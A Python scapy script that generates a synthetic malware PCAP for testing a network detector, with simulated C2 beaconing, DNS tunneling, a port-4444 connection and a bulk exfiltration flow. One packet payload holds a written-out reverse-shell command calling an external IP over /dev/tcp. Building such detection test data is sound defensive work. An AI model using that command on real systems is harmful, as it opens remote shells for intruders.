import os
import random
import time
from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap

def generate_test_pcap(output_path="samples/sample_malware.pcap"):
    """
    Constructs a synthetic, multi-vector malware PCAP file with:
      1. Benign background traffic (Google DNS & HTTPS)
      2. C2 Beaconing (Cobalt Strike simulation: 15 beacons spaced ~30s apart, std_dev < 1.0s)
      3. DNS Tunneling (high-entropy, 55+ character encoded subdomains)
      4. Direct IP & Non-standard port connection (Metasploit port 4444 to external IP without DNS)
      5. Data Exfiltration (Outbound payload totaling > 10.5MB to external host)
    """
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    packets = []
    
    base_time = 1700000000.0  # Synthetic epoch start
    internal_ip = "192.168.1.105"
    gateway_ip = "192.168.1.1"
    
    mac_client = "00:0c:29:ab:cd:ef"
    mac_gw = "00:50:56:fe:dc:ba"

    # -------------------------------------------------------------
    # 1. Benign Traffic: Google DNS Resolution & Web Browsing
    # -------------------------------------------------------------
    # DNS Query for www.google.com
    dns_query = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst="8.8.8.8") / UDP(sport=53120, dport=53) / \
                DNS(rd=1, qd=DNSQR(qname="www.google.com"))
    dns_query.time = base_time + 0.1
    packets.append(dns_query)
    
    # DNS Answer for www.google.com -> 142.250.190.46
    dns_resp = Ether(src=mac_gw, dst=mac_client) / IP(src="8.8.8.8", dst=internal_ip) / UDP(sport=53, dport=53120) / \
               DNS(qr=1, rd=1, ra=1, 
                   qd=DNSQR(qname="www.google.com"), 
                   an=DNSRR(rrname="www.google.com", type=1, rdata="142.250.190.46"))
    dns_resp.time = base_time + 0.15
    packets.append(dns_resp)

    # Legitimate HTTPS traffic to resolved IP
    for i in range(5):
        https_pkt = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst="142.250.190.46") / \
                    TCP(sport=51000 + i, dport=443, flags="PA") / Raw(load=b"\x16\x03\x01\x00\x50" + b"A"*100)
        https_pkt.time = base_time + 0.2 + (i * 0.05)
        packets.append(https_pkt)

    # -------------------------------------------------------------
    # 2. Attack Vector 1: Cobalt Strike C2 Beaconing
    # Dest IP: 198.51.100.45 (Known in threat intel)
    # 15 connections spaced by 30 seconds with very low jitter (+-0.3s)
    # -------------------------------------------------------------
    c2_ip = "198.51.100.45"
    c2_port = 8443
    beacon_mean_interval = 30.0

    current_beacon_time = base_time + 1.0
    for b_idx in range(16):
        jitter = random.uniform(-0.35, 0.35)
        conn_time = current_beacon_time + jitter
        
        syn = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst=c2_ip) / TCP(sport=49152 + b_idx, dport=c2_port, flags="S")
        syn.time = conn_time
        packets.append(syn)
        
        payload_data = b"GET /push/event/ping HTTP/1.1\r\nHost: c2.internal-update.org\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        beacon_req = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst=c2_ip) / TCP(sport=49152 + b_idx, dport=c2_port, flags="PA") / Raw(load=payload_data)
        beacon_req.time = conn_time + 0.02
        packets.append(beacon_req)
        
        current_beacon_time += beacon_mean_interval

    # -------------------------------------------------------------
    # 3. Attack Vector 2: DNS Tunneling (High-Entropy Subdomains)
    # Alphanumeric Base64-like random payload: entropy > 4.5, length > 50
    # -------------------------------------------------------------
    tunnel_apex = "tunnel.attacker-dns.org"
    alnum_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    for t_idx in range(15):
        chunk = "".join(random.choice(alnum_chars) for _ in range(50))
        tunnel_domain = f"{chunk}.{tunnel_apex}"
        
        dns_tunnel_pkt = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst="8.8.8.8") / UDP(sport=54000 + t_idx, dport=53) / \
                         DNS(rd=1, qd=DNSQR(qname=tunnel_domain))
        dns_tunnel_pkt.time = base_time + 5.0 + (t_idx * 0.8)
        packets.append(dns_tunnel_pkt)

    # -------------------------------------------------------------
    # 4. Attack Vector 3: Direct IP Connection & Non-Standard Port
    # Direct connect to external IP 45.154.255.88 (Emotet C2) on port 4444 (Metasploit)
    # No preceding DNS lookup exists for 45.154.255.88!
    # -------------------------------------------------------------
    direct_ip = "45.154.255.88"
    backdoor_port = 4444
    for d_idx in range(6):
        rev_shell_pkt = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst=direct_ip) / \
                        TCP(sport=56000 + d_idx, dport=backdoor_port, flags="PA") / \
                        Raw(load=b"sh -i >& /dev/tcp/45.154.255.88/4444 0>&1\n")
        rev_shell_pkt.time = base_time + 12.0 + (d_idx * 0.5)
        packets.append(rev_shell_pkt)

    # -------------------------------------------------------------
    # 5. Attack Vector 4: Data Exfiltration (> 10.5 MB upload)
    # Destination: 195.123.245.89 (RedLine Stealer exfiltration drop)
    # -------------------------------------------------------------
    exfil_dest = "195.123.245.89"
    exfil_port = 8080
    
    exfil_time = base_time + 20.0
    payload_chunk = b"X" * 1440
    num_exfil_packets = 7400  # 7400 * 1440 bytes ≈ 10.65 MB
    
    print(f"[SampleGenerator] Generating {num_exfil_packets} packets for 10.65MB Data Exfiltration simulation...")
    for ex_idx in range(num_exfil_packets):
        exfil_pkt = Ether(src=mac_client, dst=mac_gw) / IP(src=internal_ip, dst=exfil_dest) / \
                    TCP(sport=57100, dport=exfil_port, flags="PA") / Raw(load=payload_chunk)
        exfil_pkt.time = exfil_time + (ex_idx * 0.002)
        packets.append(exfil_pkt)

    # Sort all packets by timestamp for strict chronological integrity
    packets.sort(key=lambda p: float(p.time))
    
    print(f"[SampleGenerator] Writing {len(packets)} total packets to '{output_path}'...")
    wrpcap(output_path, packets)
    pcap_size_mb = os.path.getsize(output_path) / (1024 * 1024)
    print(f"[SampleGenerator] Generated PCAP successfully: {output_path} ({pcap_size_mb:.2f} MB)")
    return output_path

if __name__ == "__main__":
    generate_test_pcap()
